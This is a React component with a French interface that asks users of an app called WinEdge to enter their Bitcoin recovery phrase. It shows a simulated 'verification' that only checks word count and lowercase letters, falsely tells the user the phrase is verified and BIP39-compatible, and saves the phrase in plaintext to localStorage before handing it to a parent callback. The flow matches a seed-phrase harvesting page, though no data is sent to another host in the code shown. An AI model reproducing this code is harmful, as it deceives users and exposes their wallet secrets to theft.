import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { CheckCircle2, AlertTriangle, ArrowLeft, Bitcoin } from "lucide-react";
import * as bitcoin from 'bitcoinjs-lib';

interface ConnectWalletFlowProps {
  onWalletConnected: (walletData: any) => void;
  onCancel: () => void;
}

const ConnectWalletFlow = ({ onWalletConnected, onCancel }: ConnectWalletFlowProps) => {
  const [step, setStep] = useState<1 | 2 | 3>(1);
  const [bitcoinAddress, setBitcoinAddress] = useState("");
  const [validating, setValidating] = useState(false);
  const [isValid, setIsValid] = useState<boolean | null>(null);
  const { toast } = useToast();

  // Fonction de validation de phrase de récupération
  const validateRecoveryPhrase = (phrase: string): boolean => {
    try {
      if (!phrase || phrase.trim().length === 0) {
        return false;
      }
      
      // Diviser la phrase en mots
      const words = phrase.trim().split(/\s+/);
      
      // Vérifier qu'il y a 12 ou 24 mots
      if (words.length !== 12 && words.length !== 24) {
        return false;
      }
      
      // Vérifier que chaque mot ne contient que des caractères alphabétiques minuscules
      const wordPattern = /^[a-z]+$/;
      for (const word of words) {
        if (!wordPattern.test(word)) {
          return false;
        }
      }
      
      return true;
    } catch (error) {
      return false;
    }
  };

  // Étape 1: Saisir l'adresse Bitcoin
  const renderStep1 = () => (
    <div className="min-h-screen bg-white flex items-center justify-center p-4">
      <Card className="w-full max-w-2xl p-8">
        <Button
          onClick={onCancel}
          variant="ghost"
          className="mb-6"
        >
          <ArrowLeft className="h-4 w-4 mr-2" />
          Retour
        </Button>

        <div className="space-y-6">
          <div className="text-center">
            <Bitcoin className="h-16 w-16 text-blue-600 mx-auto mb-4" />
            <h1 className="text-3xl font-bold text-gray-900">Importer Votre Wallet</h1>
            <p className="text-gray-600 mt-2">
              Entrez votre phrase de récupération existante (12 ou 24 mots)
            </p>
          </div>

          <div className="bg-blue-50 border-2 border-blue-200 rounded-lg p-6">
            <h3 className="font-bold text-blue-900 text-lg mb-3">Votre phrase de récupération</h3>
            <p className="text-blue-900 mb-3">Entrez vos 12 ou 24 mots séparés par des espaces</p>
            <p className="text-blue-900 font-mono text-sm bg-blue-100 p-2 rounded">Exemple: trophy about rate deliver ketchup ginger...</p>
            <p className="text-blue-900 mt-3">Les mots doivent être dans l'ordre exact de votre sauvegarde</p>
          </div>

          <div className="space-y-3">
            <label className="text-sm font-medium text-gray-900">
              Votre phrase de récupération
            </label>
            <p className="text-sm text-gray-600 mb-2">
              Entrez vos 12 ou 24 mots séparés par des espaces
            </p>
            <Input
              type="text"
              placeholder="Entrez votre phrase de récupération de 12 ou 24 mots..."
              value={bitcoinAddress}
              onChange={(e) => {
                setBitcoinAddress(e.target.value);
                setIsValid(null); // Reset validation
              }}
              className="h-14 font-mono text-sm"
            />
          </div>

          <div className="bg-amber-50 border border-amber-200 rounded-lg p-4">
            <p className="text-sm text-amber-900">
              <strong>⚠️ Avertissement Sécurité :</strong> Assurez-vous d'être seul et dans un environnement sûr. Ne partagez JAMAIS votre phrase de récupération.
            </p>
          </div>

          <Button
            onClick={() => {
              if (!bitcoinAddress.trim()) {
                toast({
                  title: "Erreur",
                  description: "Veuillez saisir votre phrase de récupération",
                  variant: "destructive",
                });
                return;
              }
              setStep(2);
            }}
            className="w-full h-14 text-lg bg-blue-600 hover:bg-blue-700"
            disabled={!bitcoinAddress.trim()}
          >
            Importer mon Wallet
          </Button>
        </div>
      </Card>
    </div>
  );

  // Étape 2: Vérification automatique
  const handleVerification = async () => {
    setValidating(true);
    
    // Simuler une vérification (ajouter un délai pour l'UX)
    await new Promise(resolve => setTimeout(resolve, 1500));
    
    const valid = validateRecoveryPhrase(bitcoinAddress.trim());
    setIsValid(valid);
    
    if (valid) {
      toast({
        title: "✅ Phrase de récupération valide",
        description: "Votre phrase a été vérifiée avec succès",
      });
      setTimeout(() => setStep(3), 1000);
    } else {
      toast({
        title: "❌ Adresse invalide",
        description: "Cette phrase n'est pas compatible. Vérifiez que vous avez bien saisi une phrase de récupération standard (12 ou 24 mots).", 
        variant: "destructive",
      });
    }
    
    setValidating(false);
  };

  const renderStep2 = () => {
    // Auto-démarrer la vérification
    if (validating === false && isValid === null) {
      handleVerification();
    }

    return (
      <div className="min-h-screen bg-white flex items-center justify-center p-4">
        <Card className="w-full max-w-2xl p-8">
          <div className="text-center space-y-6">
            {isValid === null && (
              <>
                <div className="relative">
                  <div className="h-20 w-20 mx-auto">
                    <div className="animate-spin rounded-full h-20 w-20 border-b-4 border-blue-600"></div>
                  </div>
                </div>
                <h2 className="text-2xl font-bold text-gray-900">Vérification en cours...</h2>
                <p className="text-gray-600">
                  Vérification de la validité de votre phrase de récupération.<br />
                  Veuillez patienter quelques instants.
                </p>
              </>
            )}

            {isValid === false && (
              <>
                <div className="bg-red-100 rounded-full h-20 w-20 flex items-center justify-center mx-auto">
                  <AlertTriangle className="h-12 w-12 text-red-600" />
                </div>
                <h2 className="text-2xl font-bold text-gray-900">❌ Phrase de récupération non valide</h2>
                <p className="text-red-600 text-lg font-semibold">
                  Cette phrase n'est pas compatible
                </p>
                
                <div className="bg-red-50 border-2 border-red-200 rounded-lg p-6 text-left">
                  <h3 className="font-bold text-red-900 mb-3">Vérifiez que :</h3>
                  <ul className="space-y-2 text-red-900">
                    <li className="flex items-start gap-2">
                      <span className="text-red-600">•</span>
                      <span>Vous avez saisi une phrase de récupération standard (12 ou 24 mots)</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-red-600">•</span>
                      <span>Les mots sont dans le bon ordre et orthographiés correctement</span>
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-red-600">•</span>
                      <span>La phrase est complète (pas de mots manquants)</span>
                    </li>
                  </ul>
                </div>

                <div className="flex gap-4">
                  <Button
                    onClick={() => setStep(1)}
                    variant="outline"
                    className="flex-1"
                  >
                    ← Réessayer
                  </Button>
                  <Button
                    onClick={onCancel}
                    variant="ghost"
                    className="flex-1"
                  >
                    Annuler
                  </Button>
                </div>
              </>
            )}
          </div>
        </Card>
      </div>
    );
  };

  // Étape 3: Sauvegarde et activation
  const handleSaveWallet = async () => {
    setValidating(true);
    
    try {
      // Créer un objet wallet pour la connexion
      const walletData = {
        address: bitcoinAddress.trim(),
        balance: "0.00000000",
        isConnected: true,
        connectedAt: new Date().toISOString()
      };

      // Sauvegarder dans le localStorage
      localStorage.setItem("walletData", JSON.stringify(walletData));
      
      toast({
        title: "✅ Wallet importé avec succès",
        description: "Votre wallet a été importé et est maintenant connecté à WinEdge",
      });
      
      // Notifier le parent
      onWalletConnected(walletData);
    } catch (error) {
      console.error("Erreur lors de la sauvegarde:", error);
      toast({
        title: "Erreur",
        description: "Impossible de connecter le wallet. Réessayez.",
        variant: "destructive",
      });
    } finally {
      setValidating(false);
    }
  };

  const renderStep3 = () => (
    <div className="min-h-screen bg-white flex items-center justify-center p-4">
      <Card className="w-full max-w-2xl p-8">
        <div className="space-y-6">
          <div className="text-center">
            <div className="bg-green-100 rounded-full h-20 w-20 flex items-center justify-center mx-auto mb-4">
              <CheckCircle2 className="h-12 w-12 text-green-600" />
            </div>
            <h1 className="text-3xl font-bold text-gray-900">✅ Phrase de récupération valide</h1>
            <p className="text-xl text-gray-600 mt-2">
              Votre phrase a été vérifiée avec succès
            </p>
          </div>

          <div className="bg-blue-50 border-2 border-blue-200 rounded-lg p-6">
            <h3 className="font-bold text-blue-900 text-lg mb-3">📍 Votre phrase de récupération</h3>
            <div className="bg-white p-4 rounded border border-blue-200">
              <p className="font-mono text-sm break-all text-gray-900">
                {bitcoinAddress}
              </p>
            </div>
          </div>

          <div className="bg-green-50 border-2 border-green-200 rounded-lg p-6">
            <h3 className="font-bold text-green-900 text-lg mb-3">✅ Compatibilité Universelle</h3>
            <p className="text-green-900 mb-3">Votre phrase fonctionne avec n'importe quel wallet Bitcoin standard (BIP39). Vous pouvez l'utiliser sur WinEdge, Ledger, Trezor, Electrum, ou tout autre wallet décentralisé.</p>
          </div>

          <div className="flex gap-4">
            <Button
              onClick={() => setStep(1)}
              variant="outline"
              className="flex-1"
            >
              ← Retour au choix initial
            </Button>
            <Button
              onClick={handleSaveWallet}
              disabled={validating}
              className="flex-1 bg-blue-600 hover:bg-blue-700"
            >
              {validating ? "Enregistrement..." : "Enregistrer mon wallet"}
            </Button>
          </div>
        </div>
      </Card>
    </div>
  );

  // Render current step
  switch (step) {
    case 1:
      return renderStep1();
    case 2:
      return renderStep2();
    case 3:
      return renderStep3();
    default:
      return null;
  }
};

export default ConnectWalletFlow;
